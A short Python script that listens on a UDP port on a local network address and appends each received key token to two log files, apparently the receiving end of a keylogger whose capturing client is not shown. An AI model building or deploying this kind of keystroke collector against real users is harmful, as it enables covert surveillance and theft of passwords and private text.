import socket

UDP_IP = "192.168.1.126"
UDP_PORT = 8000

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind((UDP_IP, UDP_PORT))

while 1:
	data, addr = s.recvfrom(32)
	key = data.decode('UTF-8')
	with open("log.txt", "a") as log:
		if key == "_ENTER_": 
			log.write("\n")
		
		if key[0] != '_': 
			log.write(key)

	with open("lograw.txt", "a") as log:
			log.write(key)